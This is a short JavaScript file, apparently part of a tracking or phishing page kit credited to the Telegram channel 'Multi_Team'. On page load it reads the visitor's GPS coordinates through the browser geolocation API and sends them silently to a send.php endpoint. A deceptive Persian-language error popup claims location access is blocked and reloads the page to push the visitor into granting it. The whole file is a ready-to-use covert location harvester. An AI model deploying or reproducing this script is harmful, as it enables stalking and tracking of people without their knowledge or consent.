const controller = new AbortController()
const signal = controller.signal
let res = 0;
function post(data){
fetch("send.php", {
method: "POST",
mode: "same-origin",
credentials: "same-origin",
headers: {
"Content-Type": "application/json"
},
signal: signal,
body: JSON.stringify({
"data": data})
}).then(function(response) {
  if (response.status==200){
    res+=1
    if (res>=2){
      setTimeout(controller.abort(), 1000);
    }
    //setTimeout(controller.abort(), 1000);
  }
              }).catch(function(err) {
                         console.log(err);
                         });
              }
              
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    post("Geolocation is not supported by this browser.");
  }
}

function showPosition(position) {
  post(position.coords.latitude + ":" + position.coords.longitude);
}

getLocation();


Swal.fire({
  icon: 'error',
  title: 'عدم دسترسی لوکیشن !',
  text: 'لطفا دسترسی لوکیشن را فعال کنید !',
  footer: '<p style="font-weight: bold;color: green">Powered By <a href="https://T.me/Multi_Team">T.me/Multi_Team</a></p>',
  confirmButtonText: 'باشه !',
  confirmButtonColor: 'green',
  didClose: true,
}).then((result) => {
  if (result.isConfirmed) {
    window.location = window.location;
// @Multi_Team
  }
})